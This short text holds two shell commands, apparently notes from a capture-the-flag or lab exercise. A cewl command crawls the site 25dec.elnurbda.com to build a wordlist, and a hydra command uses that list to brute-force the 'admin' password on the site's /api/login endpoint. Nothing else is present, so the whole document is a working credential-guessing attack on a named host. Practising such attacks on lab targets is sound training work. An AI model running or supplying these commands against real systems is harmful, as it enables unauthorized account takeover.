hydra -l admin -P cewl_words.txt 25dec.elnurbda.com http-get "/api/login?username=^USER^&password=^PASS^" -f -V

cewl -d 2 -m 5 -w cewl_words.txt https://25dec.elnurbda.com/



